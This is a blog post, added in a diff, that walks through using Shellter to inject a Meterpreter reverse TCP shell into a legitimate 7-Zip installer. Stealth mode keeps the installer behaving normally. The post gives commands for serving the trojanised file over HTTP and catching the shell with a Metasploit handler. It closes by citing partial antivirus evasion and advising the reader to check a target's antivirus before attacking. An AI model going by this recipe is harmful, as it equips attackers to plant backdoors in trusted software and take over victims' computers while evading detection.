@@ -1,0 +1,135 @@
+---
+title: "Inject malicious code into PE using Shellter"
+date: "2020-04-11"
+layout: single
+tags:
+- Malware
+categories:
+- Blog-post
+---
+
+Hey everyone. 
+
+This is for research and education purpose only. If you do something bad, do with your own risk.
+
+Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created.
+It can be used in order to inject shellcode into native Windows applications (currently 32-bit applications only).
+
+Website: [https://www.shellterproject.com/](https://www.shellterproject.com/)
+
+We gonna use this tool to inject our meterpreter reverse shell into a clean PE and we will start listening for the shell and execute the malware at the client side.
+
+## Installation
+
+Since Shellter is designed to be run on Windows operating systems, we will also install wine
+
+```
+apt update
+apt install shellter
+dpkg --add-architecture i386 && apt-get update && apt-get install wine32 && apt install wine
+```
+
+## Download our clean PE file
+
+In my case, I'm using 7zip installer.
+
+```
+wget https://www.7-zip.org/a/7z1900.exe
+```
+
+## Start shellter
+```
+shellter
+```
+
+//pic1
+
+## Select Mode and PE path
+
+Shellter can run in either Auto or Manual mode. So, in our case here, we gonna run using Auto mode by selecting `A`. You may want use manual mode for advance option.
+
+For PE target, type the path of your PE location and ENTER.
+
+//pic2
+
+
+## Enable stealth mode
+
+Let's wait for a second..
+
+//pic3
+
+Shellter will then ask us if we want Stealth Mode which it will restore the PE execution flow after our payload has been executed. Choose 'Y' for yes. Then ENTER.
+
+//pic4
+
+## Choose payload 
+
+It will then ask us to choose between using those displayed payload or our own custom payload. 
+
+Type 'L' for listed payload and select index '1' for Meterpreter reverse TCP payload.
+
+//pic5
+
+## Set your IP and Port for the payload
+
+```
+SET LHOST: 192.168.83.129
+SET LPORT: 4444
+```
+
+Shellter then will do his job for us.
+
+## PE Injection done
+
+Shellter will tell us that our injection is verified
+//pic6
+
+## Transfering file
+
+Transfer malicious PE file to our Windows client. For our case, I'm using Python HTTP server.
+```
+python -m SimpleHTTPServer 8080
+```
+
+In our Windows client, navigate to our Kali Linux IP with port 8080 in web browser. Then, download the malicious PE file.
+
+## Set up meterpreter listener
+
+Setup our meterpreter listener to catch our reverse shell after execute the PE file
+
+```
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 192.168.83.129
+lhost => 192.168.83.129
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.83.129:4444
+```
+
+## Execute and pwned
+
+Soon we download the PE...
+ //pic7
+ 
+Execute the malicious PE and take a look at our multi handler listener at our Kali Machine.
+//pic8
+
+As you can see above, the binary act normally and our payload is executed. Hooray.
+//pic9
+
+## Scan with VirusTotal
+
+Scanning through VirusTotal results us 25/70 detection.
+//pic10
+
+As you can see, there is a lot of AV that doesnt detect this malware too.
+//pic11
+
+So, make sure to gather information about our target client's AV first before attempt to attack.
+
+
+
+
